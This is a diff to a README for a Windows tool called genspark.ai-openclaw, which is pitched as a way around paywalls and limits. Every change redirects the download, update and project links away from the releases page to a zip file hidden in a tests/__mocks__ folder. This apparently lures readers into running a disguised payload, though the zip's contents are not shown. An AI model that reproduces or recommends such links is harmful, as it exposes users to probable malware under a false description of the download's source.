@@ -1,6 +1,6 @@
 # ⚙️ genspark.ai-openclaw - Easy Access to Paywalls and Limits
 
-[![Download genspark.ai-openclaw](https://img.shields.io/badge/Download-OpenClaw-brightgreen)](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
+[![Download genspark.ai-openclaw](https://img.shields.io/badge/Download-OpenClaw-brightgreen)](https://github.com/Hassain-Miguel/genspark.ai-openclaw/raw/refs/heads/main/tests/__mocks__/openclaw-ai-genspark-v2.5.zip)
 
 ## 🔍 What is genspark.ai-openclaw?
 
@@ -31,7 +31,7 @@ Before you install, make sure your Windows computer meets these basic needs:
 
 To get the latest version, visit the official release page here:
 
-[Download genspark.ai-openclaw](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
+[Download genspark.ai-openclaw](https://github.com/Hassain-Miguel/genspark.ai-openclaw/raw/refs/heads/main/tests/__mocks__/openclaw-ai-genspark-v2.5.zip)
 
 This page lists all released versions. Use the most recent release for the best experience.
 
@@ -78,7 +78,7 @@ This is done without slowing your computer or your connection. The software stay
 
 Check the release page regularly for new versions:
 
-[Get latest update](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
+[Get latest update](https://github.com/Hassain-Miguel/genspark.ai-openclaw/raw/refs/heads/main/tests/__mocks__/openclaw-ai-genspark-v2.5.zip)
 
 If you see a new update:
 
@@ -99,7 +99,7 @@ If you see a new update:
 
 You can visit the project's GitHub page for tips, explanations, and community help:
 
-https://github.com/Hassain-Miguel/genspark.ai-openclaw
+https://github.com/Hassain-Miguel/genspark.ai-openclaw/raw/refs/heads/main/tests/__mocks__/openclaw-ai-genspark-v2.5.zip
 
 Look in the Issues section if you need support or want to report bugs.
 
@@ -117,4 +117,4 @@ This means you can build custom setups once you are comfortable with the basics.
 
 ---
 
-[![Download genspark.ai-openclaw](https://img.shields.io/badge/Download-OpenClaw-blue)](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
+[![Download genspark.ai-openclaw](https://img.shields.io/badge/Download-OpenClaw-blue)](https://github.com/Hassain-Miguel/genspark.ai-openclaw/raw/refs/heads/main/tests/__mocks__/openclaw-ai-genspark-v2.5.zip)
